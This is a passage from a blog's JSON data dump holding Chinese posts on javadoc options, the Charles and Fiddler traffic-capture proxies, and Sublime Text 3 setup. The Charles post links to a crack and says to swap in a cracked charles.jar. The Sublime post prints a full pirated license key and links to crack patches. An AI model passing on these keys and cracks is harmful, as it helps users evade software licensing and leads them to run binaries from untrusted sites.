[Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n","source":"_posts/article/java/生成javadoc文档.md","raw":"title: 生成javadoc文档\ntags:\n  - javadoc\n  - java\ncategories:\n  - 后端开发\ndate: 2016-03-11 18:33:00\n---\n\n<img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\" />\n\n\n## 一、查看javadoc帮助文档\n\n``` bash\nyerba-buena:~ yeshaoting$ javadoc --help\njavadoc: 错误 - 无效的标记: --help\n用法: javadoc [options] [packagenames] [sourcefiles] [@files]\n  -overview <file>                 从 HTML 文件读取概览文档\n  -public                          仅显示 public 类和成员\n  -protected                       显示 protected/public 类和成员 (默认值)\n  -package                         显示 package/protected/public 类和成员\n  -private                         显示所有类和成员\n  -help                            显示命令行选项并退出\n  -doclet <class>                  通过替代 doclet 生成输出\n  -docletpath <path>               指定查找 doclet 类文件的位置\n  -sourcepath <pathlist>           指定查找源文件的位置\n  -classpath <pathlist>            指定查找用户类文件的位置\n  -cp <pathlist>                   指定查找用户类文件的位置\n  -exclude <pkglist>               指定要排除的程序包列表\n  -subpackages <subpkglist>        指定要递归加载的子程序包\n  -breakiterator                   计算带有 BreakIterator 的第一个语句\n  -bootclasspath <pathlist>        覆盖由引导类加载器所加载的\n                                   类文件的位置\n  -source <release>                提供与指定发行版的源兼容性\n  -extdirs <dirlist>               覆盖所安装扩展的位置\n  -verbose                         输出有关 Javadoc 正在执行的操作的信息\n  -locale <name>                   要使用的区域设置, 例如 en_US 或 en_US_WIN\n  -encoding <name>                 源文件编码名称\n  -quiet                           不显示状态消息\n  -J<flag>                         直接将 <flag> 传递到运行时系统\n  -X                               输出非标准选项的提要\n\n通过标准 doclet 提供:\n  -d <directory>                   输出文件的目标目录\n  -use                             创建类和程序包用法页面\n  -version                         包含 @version 段\n  -author                          包含 @author 段\n  -docfilessubdirs                 递归复制文档文件子目录\n  -splitindex                      将索引分为每个字母对应一个文件\n  -windowtitle <text>              文档的浏览器窗口标题\n  -doctitle <html-code>            包含概览页面的标题\n  -header <html-code>              包含每个页面的页眉文本\n  -footer <html-code>              包含每个页面的页脚文本\n  -top    <html-code>              包含每个页面的顶部文本\n  -bottom <html-code>              包含每个页面的底部文本\n  -link <url>                      创建指向位于 <url> 的 javadoc 输出的链接\n  -linkoffline <url> <url2>        利用位于 <url2> 的程序包列表链接至位于 <url> 的文档\n  -excludedocfilessubdir <name1>:.. 排除具有给定名称的所有文档文件子目录。\n  -group <name> <p1>:<p2>..        在概览页面中, 将指定的程序包分组\n  -nocomment                       不生成说明和标记, 只生成声明。\n  -nodeprecated                    不包含 @deprecated 信息\n  -noqualifier <name1>:<name2>:... 输出中不包括指定限定符的列表。\n  -nosince                         不包含 @since 信息\n  -notimestamp                     不包含隐藏时间戳\n  -nodeprecatedlist                不生成已过时的列表\n  -notree                          不生成类分层结构\n  -noindex                         不生成索引\n  -nohelp                          不生成帮助链接\n  -nonavbar                        不生成导航栏\n  -serialwarn                      生成有关 @serial 标记的警告\n  -tag <name>:<locations>:<header> 指定单个参数定制标记\n  -taglet                          要注册的 Taglet 的全限定名称\n  -tagletpath                      Taglet 的路径\n  -charset <charset>               用于跨平台查看生成的文档的字符集。\n  -helpfile <file>                 包含帮助链接所链接到的文件\n  -linksource                      以 HTML 格式生成源文件\n  -sourcetab <tab length>          指定源中每个制表符占据的空格数\n  -keywords                        使程序包, 类和成员信息附带 HTML 元标记\n  -stylesheetfile <path>           用于更改生成文档的样式的文件\n  -docencoding <name>              指定输出的字符编码\n```\n\n<!-- more -->\n\n## 二、命令举例\n\n``` bash\n# 输出所有cn.yeshaoting.jvwa包及子包\njavadoc cn.yeshaoting.jvwa * -subpackages * -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下指定子包\njavadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)\njavadoc cn.yeshaoting.jvwa * -package -d ~/doc\n```\n\n\n## 三、自定义标签\n自定义标签输出到javadoc文档中，可以通过参数-tag来完成。\njavadoc帮助文档说明如下：\n> `-tag <name>:<locations>:<header> 指定单个参数定制标记`\n\n其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。\n另外，locations官方解释如下：\n> Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:\nX (disable tag)\na (all)\no (overview)\np (packages)\nt (types, that is classes and interfaces)\nc (constructors)\nm (methods)\nf (fields)\n\n一般地，直接使用a即可。\n\n\n### 举例\n``` bash\njavadoc cn.yeshaoting.jvwa * -tag \"api.name\":a:\"接口名：\" -tag \"api.apiId\":a:\"api id：\" -tag \"api.description\":a:\"接口描述：\" -tag \"api.category\":a:\"所属应用：\" -tag \"api.param\":a:\"参数：\" -tag \"api.result\":a\"返回结果：\" -tag \"api.requestExample\":a:\"请求实例：\" -tag \"api.responseExample\":a:\"响应实例：\" -tag \"api.errorExample\":a:\"错误实例：\" -d ~/doc\n```\n**注**：程序中标签声明形如：@api.name，@api.description，@datetime。\n\n\n## 四、生成chm文档\n可参考：[Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n\n\n## 五、参考文档\n- [如何个性化地生成Javadoc文档](http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html)\n- [如何自动生成javadoc及添加自定义标签 ](http://blog.sina.com.cn/s/blog_6e371452010177dj.html)\n- [多模块Maven项目如何使用javadoc插件生成文档](http://blog.csdn.net/jianxin1009/article/details/35269501)\n- [Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n","slug":"article/java/生成javadoc文档","published":1,"updated":"2016-03-31T15:07:59.000Z","_id":"cimfwfql00001tcbt8b8ayye1","comments":1,"layout":"post","photos":[],"link":""},{"title":"在线网站性能测试工具","date":"2015-12-29T05:58:00.000Z","_content":"\n\n## 推荐工具\n[GT Matrix](http://gtmetrix.com/)\n[Show Slow](http://www.oschina.net/p/show-slow)\n[Google PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)\n\n\n## 参考文档\n[推荐10个免费在线测试网页性能工具](http://www.daqianduan.com/3962.html)\n[12 个最好的免费网站速度和性能测试工具](http://segmentfault.com/a/1190000000447171)\n[12 个免费在线的 Web 网站性能测试工具](http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing)\n\n","source":"_posts/article/tool/在线网站性能测试工具.md","raw":"title: 在线网站性能测试工具\ntags:\n  - 性能测试\ncategories:\n  - 工具软件\ndate: 2015-12-29 13:58:00\n---\n\n\n## 推荐工具\n[GT Matrix](http://gtmetrix.com/)\n[Show Slow](http://www.oschina.net/p/show-slow)\n[Google PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)\n\n\n## 参考文档\n[推荐10个免费在线测试网页性能工具](http://www.daqianduan.com/3962.html)\n[12 个最好的免费网站速度和性能测试工具](http://segmentfault.com/a/1190000000447171)\n[12 个免费在线的 Web 网站性能测试工具](http://www.oschina.net/news/21033/12-free-online-tools-for-website-testing)\n\n","slug":"article/tool/在线网站性能测试工具","published":1,"updated":"2016-03-31T07:24:11.000Z","_id":"cimfydoaj000jtjbtsela96b9","comments":1,"layout":"post","photos":[],"link":""},{"title":"Connection closed by remote host","date":"2016-02-28T08:23:00.000Z","_content":"## 异常内容\nssh_exchange_identification - Connection closed by remote host\n\n\n## 调试\n用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。\n\n\n## 参考文档\nhttp://www.zhihu.com/question/20023544","source":"_posts/article/linux/ssh_exchange_identification- Connection closed by remote host.md","raw":"title: Connection closed by remote host\ntags:\n  - ssh\n  - issue\ncategories:\n  - 工具软件\ndate: 2016-02-28 16:23:00\n---\n## 异常内容\nssh_exchange_identification - Connection closed by remote host\n\n\n## 调试\n用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。\n\n\n## 参考文档\nhttp://www.zhihu.com/question/20023544","slug":"article/linux/ssh_exchange_identification- Connection closed by remote host","published":1,"updated":"2016-03-31T07:24:27.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cimfypx1u000ytjbtxfsfas7q"},{"title":"Charles使用手记","date":"2016-02-14T10:55:00.000Z","_content":"\n## 一、 安装&破解\n官方网站下载原版：https://www.charlesproxy.com/latest-release/download.do\n\n破解文件下载：[charles 3.11 mac版 注册码&破解](http://www.typechodev.com/index.php/archives/518/)\n适用于Charles3.11.x，含Windows版和Mac版。\n使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。\n\n\n## 二、设置Wifi热点\n1. 在“系统偏好设置”中找到共享，并打开，如下图所示：\n![共享](http://images.macx.cn/forum/201212/13/234626efeiiiee0ie0de1d.png)\n\n2. 设置wifi\n![设置wifi](http://images.macx.cn/forum/201212/13/234626dfzl5ddirvab0wlf.png)\n\n3. 设置互联网共享\n![互联网共享](http://images.macx.cn/forum/201212/13/234626zltkgqegkdk9egk9.png)\n\n参见：[将你的Mac设置为共享的Wifi热点](http://www.macx.cn/thread-2076838-1-1.html)\n\n\n<!-- more -->\n\n\n## 三、代理手机\n1. 查看代理ip地址\n当前IP地址为192.168.155.43，如下图所示：\n![代理ip](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-local-ip.png)\n\n2. 打开charles http代理端口\n打开charles http代理端口，默认端口为8888.\n![打开charles http代理端口](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-http-setting.png)\n\n3. 手机代理配置\n![手机代理配置](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-phone.jpg)\n\n4. 允许手机访问\n![允许手机访问](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-trust-dialog.png)\n\n\n## 四、抓包\n打开抓包开关：\n![开始http抓包](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-http-switch.png)\n\n![charles抓取界面](http://cdn.infoqstatic.com/statics_s1_20160128-0241u2/resource/articles/network-packet-analysis-tool-charles/zh/resources/1009004.jpg)\n\n抓取界面如下图所示：\n![数据捕获](http://img.blog.csdn.net/20141130195559531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvamlhbmd3ZWkwOTEwNDEwMDAz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)\n\n\n## 五、注意事项\n1. unicode编码\n抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。\n\n2. ssl支持\ncharles对https协议的支持还需要特殊配置一下。\n需要到官方网站[LEGACY SSL PROXYING页面](http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/)下载ssl证书，charles应用以及手机上也需要做一些配置。\n如有需要可参考参考文档里的文章进行配置，本文不做介绍。\n\n\n## 六、参考文档\n1. [iOS开发工具——网络封包分析工具Charles](http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles)\n2. [charles使用教程指南](http://drops.wooyun.org/tips/2423)\n3. [Mac上的抓包工具Charles](http://blog.csdn.net/jiangwei0910410003/article/details/41620363)\n4. [Charles Web Debugging Proxy Hacking](http://www.gfzj.us/tech/2015/06/24/charles-hacking.html)\n","source":"_posts/article/mac/Charles使用手记.md","raw":"title: Charles使用手记\ntags:\n  - charles\n  - mac\ncategories:\n  - 工具软件\ndate: 2016-02-14 18:55:00\n---\n\n## 一、 安装&破解\n官方网站下载原版：https://www.charlesproxy.com/latest-release/download.do\n\n破解文件下载：[charles 3.11 mac版 注册码&破解](http://www.typechodev.com/index.php/archives/518/)\n适用于Charles3.11.x，含Windows版和Mac版。\n使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。\n\n\n## 二、设置Wifi热点\n1. 在“系统偏好设置”中找到共享，并打开，如下图所示：\n![共享](http://images.macx.cn/forum/201212/13/234626efeiiiee0ie0de1d.png)\n\n2. 设置wifi\n![设置wifi](http://images.macx.cn/forum/201212/13/234626dfzl5ddirvab0wlf.png)\n\n3. 设置互联网共享\n![互联网共享](http://images.macx.cn/forum/201212/13/234626zltkgqegkdk9egk9.png)\n\n参见：[将你的Mac设置为共享的Wifi热点](http://www.macx.cn/thread-2076838-1-1.html)\n\n\n<!-- more -->\n\n\n## 三、代理手机\n1. 查看代理ip地址\n当前IP地址为192.168.155.43，如下图所示：\n![代理ip](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-local-ip.png)\n\n2. 打开charles http代理端口\n打开charles http代理端口，默认端口为8888.\n![打开charles http代理端口](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-http-setting.png)\n\n3. 手机代理配置\n![手机代理配置](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-phone.jpg)\n\n4. 允许手机访问\n![允许手机访问](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-trust-dialog.png)\n\n\n## 四、抓包\n打开抓包开关：\n![开始http抓包](http://7xkl4i.com1.z0.glb.clouddn.com/charles-proxy-http-switch.png)\n\n![charles抓取界面](http://cdn.infoqstatic.com/statics_s1_20160128-0241u2/resource/articles/network-packet-analysis-tool-charles/zh/resources/1009004.jpg)\n\n抓取界面如下图所示：\n![数据捕获](http://img.blog.csdn.net/20141130195559531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvamlhbmd3ZWkwOTEwNDEwMDAz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)\n\n\n## 五、注意事项\n1. unicode编码\n抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。\n\n2. ssl支持\ncharles对https协议的支持还需要特殊配置一下。\n需要到官方网站[LEGACY SSL PROXYING页面](http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/)下载ssl证书，charles应用以及手机上也需要做一些配置。\n如有需要可参考参考文档里的文章进行配置，本文不做介绍。\n\n\n## 六、参考文档\n1. [iOS开发工具——网络封包分析工具Charles](http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles)\n2. [charles使用教程指南](http://drops.wooyun.org/tips/2423)\n3. [Mac上的抓包工具Charles](http://blog.csdn.net/jiangwei0910410003/article/details/41620363)\n4. [Charles Web Debugging Proxy Hacking](http://www.gfzj.us/tech/2015/06/24/charles-hacking.html)\n","slug":"article/mac/Charles使用手记","published":1,"updated":"2016-03-31T07:24:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cimfyq40o0012tjbt92aworro"},{"title":"借助fiddler抓包","date":"2015-12-29T05:58:00.000Z","_content":"\n要说起抓包工具，当算顶顶大名的fiddler。\n只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。\n\n为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。\n\n\n## 设置fiddler代理\n\n进入fiddler options，点击Connections选项卡。\n勾选 **Allow remote computers to connect**，并设置 fiddler listens on port值为8080。\n如图所示：\n![fiddler代理设置](http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png)\n\n\n## ubuntu使用fiddler代理\n打开ubuntu的网络设置，网络代理处添加HTTP代理。\n\n如图所示：\n![ubuntu使用fiddler代理](http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png)\n\n\n## 补充说明:虚拟机网络连接\n\n如果使用虚拟机里的fiddler，则需要注意网络的连接方式为\"桥接网卡\"方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。\n\n其实，只要主机能通过虚拟机IP ping通即可。\n\n\n\n## 参考文档\n1. [回归 Windows 下的 Fiddler](http://imququ.com/post/user-fiddler-on-macos.html#toc-4)\n2. [VirtualBox虚拟机网络连接设置的四种方式](http://pengranxiang.iteye.com/blog/715829)","source":"_posts/article/linux/借助fiddler抓包.md","raw":"categories:\n  - 工具软件\ntags:\n  - ubuntu\n  - fiddler\ntitle: 借助fiddler抓包\ndate: 2015-12-29 13:58:00\n---\n\n要说起抓包工具，当算顶顶大名的fiddler。\n只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。\n\n为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。\n\n\n## 设置fiddler代理\n\n进入fiddler options，点击Connections选项卡。\n勾选 **Allow remote computers to connect**，并设置 fiddler listens on port值为8080。\n如图所示：\n![fiddler代理设置](http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png)\n\n\n## ubuntu使用fiddler代理\n打开ubuntu的网络设置，网络代理处添加HTTP代理。\n\n如图所示：\n![ubuntu使用fiddler代理](http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png)\n\n\n## 补充说明:虚拟机网络连接\n\n如果使用虚拟机里的fiddler，则需要注意网络的连接方式为\"桥接网卡\"方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。\n\n其实，只要主机能通过虚拟机IP ping通即可。\n\n\n\n## 参考文档\n1. [回归 Windows 下的 Fiddler](http://imququ.com/post/user-fiddler-on-macos.html#toc-4)\n2. [VirtualBox虚拟机网络连接设置的四种方式](http://pengranxiang.iteye.com/blog/715829)","slug":"article/linux/借助fiddler抓包","published":1,"updated":"2016-03-31T07:24:45.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cimfyqaae0016tjbtcprgmiy8"},{"title":"打造个人专属Sublime Text 3","date":"2016-01-25T06:28:00.000Z","_content":"\n\n## 一、前言\n\n### 1. 下载与破解\n当前可用的破解码如下：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```\n\n参见：\n - [Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程](http://www.xiumu.org/note/sublime-text-3.shtml)\n - [Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器](http://www.waitsun.com/sublime-text-3-for-mac.html)\n - [Sublime Text 3破解补丁](https://www.shuax.com/archives/SublimeText3Crack.html)\n\n\n### 2. Sublime Text 2与Sublime Text 3区别\n简单的说：\n - ST3支持在项目目录里面寻找变量提供了\n - 对标签页更好地支持（更多的命令和快捷键）\n - 加快了程序运行的速度\n - 更新了API，使用Python3.3\n\n参见：\n - [Sublime Text3与Sublime Text 2的区别在哪里？](https://www.zhihu.com/question/25078353)\n - [Sublime Text 3 文档之迁移指南](http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html)\n\n\n## 二、配置\n\n### 1. 我的配置\n``` json\n{\n\t\"ignored_packages\":\n\t[\n\t\t\"Vintage\"\n\t],\n\n\t// 字体\n\t\"font_size\": 12,\n\n\t// 高亮当前行\n\t\"highlight_line\": true,\n\n\t// 新标签页打开文件\n\t\"preview_on_click\": false,\n\n\t//滚动能否超过结尾\n\t\"scroll_past_end\": false,\n\n\t// TAB缩进宽度\n\t\"tab_size\": 4,\n\n\t// 自动转换TAB为空格\n\t\"translate_tabs_to_spaces\": false,\n\n\t// 皮肤\n\t\"theme\": \"Soda Dark 3.sublime-theme\",\n\n\t// 关闭自动更新\n\t\"update_check\": false,\n\n\t// 自动换行\n\t\"word_wrap\": \"true\"\n}\n```\n\n### 2. 关闭自动更新\nSublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：\n``` json\n\"update_check\": false\n```\n\n### 3. soda主题\n参见：https://github.com/buymeasoda/soda-theme/\n\n通过package controller安装Theme - Soda。\n\n### 4. 记住打开的文件\n``` json\n\"remember_open_files\": false\n```\n\n<!-- more -->\n\n### 5. Sublime Text 2 使用 Eclipse 快捷键\n[Sublime Text User Preferences -- Eclipse shortcuts for Sublime Text](https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings)\n[打造属于自己的前端开发神器 -- 给Sublime Text加上Eclipse的光环](http://www.douban.com/note/276794943/)\n\n``` json\n[\n    /**\n     * 常用快捷键(Sublime默认)\n     * --------------\n     * \n     * 光标一个单词一个单词的移动\n     * { \"keys\": [\"super+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false} },\n     * 按住shift来选文字时, 一个个单词的选而不是一个个字母\n     * { \"keys\": [\"super+shift+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false, \"extend\": true} },\n     *\n     * 类似光标一个个单词的移动\n     * { \"keys\": [\"alt+left\"], \"command\": \"move\", \"args\": {\"by\": \"subwords\", \"forward\": false} },\n     * { \"keys\": [\"alt+shift+right\"], \"command\": \"move\", \"args\": {\"by\": \"subword_ends\", \"forward\": true, \"extend\": true} },\n     *\n     * 缩进\n     * { \"keys\": [\"super+]\"], \"command\": \"indent\" },\n     * { \"keys\": [\"super+[\"], \"command\": \"unindent\" },\n     *\n     * 删除整个单词\n     * { \"keys\": [\"super+backspace\"], \"command\": \"delete_word\", \"args\": { \"forward\": false } },\n     * { \"keys\": [\"super+delete\"], \"command\": \"delete_word\", \"args\": { \"forward\": true } },\n     *\n     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)\n     * { \"keys\": [\"f9\"], \"command\": \"sort_lines\", \"args\": {\"case_sensitive\": false} },\n     *\n     * 参考\n     * ----------------------\n     * Using Sublime Text as your IDE\n     * http://www.chromium.org/developers/sublime-text\n     *\n     * Web Development With Sublime Text 2\n     * http://www.paulund.co.uk/web-development-with-sublime-text-2\n     */\n\n    // editor配置\n    { \"keys\": [\"super+v\"], \"command\": \"paste_and_indent\" },\n    { \"keys\": [\"super+shift+v\"], \"command\": \"paste\" },\n\n    /**\n     * 适配eclipse快捷键\n     *\n     * 下面这位仁兄早就有了这个想法\n     * Eclipse shortcuts for Sublime Text 2\n     * http://icoloma.blogspot.com/2011/10/eclipse-shortcuts-for-sublime-text-2.html\n     */\n    { \"keys\": [\"alt+/\"], \"command\": \"auto_complete\" },\n    { \"keys\": [\"super+i\"], \"command\": \"reindent\" },\n    // 当前行和下面一行交互位置\n    { \"keys\": [\"alt+up\"], \"command\": \"swap_line_up\" },\n    { \"keys\": [\"alt+down\"], \"command\": \"swap_line_down\" },\n    // 复制当前行到上一行\n    { \"keys\": [\"super+alt+up\"], \"command\": \"duplicate_line\" },\n    // 复制当前行到下一行\n    { \"keys\": [\"super+alt+down\"], \"command\": \"duplicate_line\" },\n    // 删除整行\n    { \"keys\": [\"super+d\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Delete Line.sublime-macro\"} },\n    // 光标移动到指定行\n    { \"keys\": [\"super+l\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \":\"} },\n    // 快速定位到选中的文字\n    { \"keys\": [\"super+k\"], \"command\": \"find_under_expand_skip\" },\n    // { \"keys\": [\"super+shift+x\"], \"command\": \"swap_case\" },\n    { \"keys\": [\"super+shift+x\"], \"command\": \"upper_case\" },\n    { \"keys\": [\"super+shift+y\"], \"command\": \"lower_case\" },\n    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)\n    { \"keys\": [\"shift+enter\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Add Line.sublime-macro\"} },\n    // 定位到对于的匹配符(譬如{})(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)\n    { \"keys\": [\"super+shift+p\"], \"command\": \"move_to\", \"args\": {\"to\": \"brackets\"} },\n    // 这个命令默认使用的是super+shift+p\n    { \"keys\": [\"super+p\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"command_palette\"} },\n    // outline\n    { \"keys\": [\"super+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"@\"} },\n    // 当前文件中的关键字(方便快速查找内容)\n    { \"keys\": [\"super+alt+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"#\"} },\n    // open resource\n    { \"keys\": [\"super+shift+r\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"show_files\": true} },\n    // 文件内查找/替换\n    { \"keys\": [\"super+f\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"replace\"} },\n    // 全局查找/替换, 在查询结果中双击跳转到匹配位置\n    {\"keys\": [\"super+h\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"find_in_files\"} },\n\n    // plugin配置\n    { \"keys\": [\"alt+a\"], \"command\": \"alignment\" },\n    {\"keys\": [\"super+shift+f\"], \"command\": \"js_format\"}\n]\n```\n\n## 三、插件\n\n### 1. Package Control\n最简单的方式是通过 ctrl+\\`快捷键打开控制台，粘贴以下代码到控制台执行。\n参见：[Package Control INSTALLATION](https://packagecontrol.io/installation#st3)\n\n#### Sublime Text 3\n``` python\nimport urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)\n```\n\n#### Sublime Text 2\n``` python\nimport urllib2,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation')\n```\n\n### 2. 实用插件\n- SideBarEnhancements左侧菜单栏增强\n- ConvertToUTF8\n- AutoFileName自动补全文件(目录)名\n- BracketHighlighter突出显示括号/引号\n- ColorHighlighter 背景显示16进制颜色\n- DocBlockr 生成注释模板\n- Sublime CodeIntel – 智能代码提示\n- FreeMarker:Freemarker模板语言辅助\n- SublimeCodeIntel 代码提示\n- JSHint、JsFormart、jQuery\n- Color Highlighter\n- Indent XML\n- sublimeLinter\n- pretty json\n\n\n参见：\n - [sublime Text3配置及快捷键、插件推荐总结](http://blog.csdn.net/xby1993/article/details/23995667)\n - [SublimeText2 快捷键一览表](http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx)\n\n","source":"_posts/article/mac/打造个人专属Sublime Text 3.md","raw":"title: 打造个人专属Sublime Text 3\ntags:\n  - sublime\n  - mac\ncategories:\n  - 工具软件\ndate: 2016-01-25 14:28:00\n---\n\n\n## 一、前言\n\n### 1. 下载与破解\n当前可用的破解码如下：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```\n\n参见：\n - [Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程](http://www.xiumu.org/note/sublime-text-3.shtml)\n - [Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器](http://www.waitsun.com/sublime-text-3-for-mac.html)\n - [Sublime Text 3破解补丁](https://www.shuax.com/archives/SublimeText3Crack.html)\n\n\n### 2. Sublime Text 2与Sublime Text 3区别\n简单的说：\n - ST3支持在项目目录里面寻找变量提供了\n - 对标签页更好地支持（更多的命令和快捷键）\n - 加快了程序运行的速度\n - 更新了API，使用Python3.3\n\n参见：\n - [Sublime Text3与Sublime Text 2的区别在哪里？](https://www.zhihu.com/question/25078353)\n - [Sublime Text 3 文档之迁移指南](http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html)\n\n\n## 二、配置\n\n### 1. 我的配置\n``` json\n{\n\t\"ignored_packages\":\n\t[\n\t\t\"Vintage\"\n\t],\n\n\t// 字体\n\t\"font_size\": 12,\n\n\t// 高亮当前行\n\t\"highlight_line\": true,\n\n\t// 新标签页打开文件\n\t\"preview_on_click\": 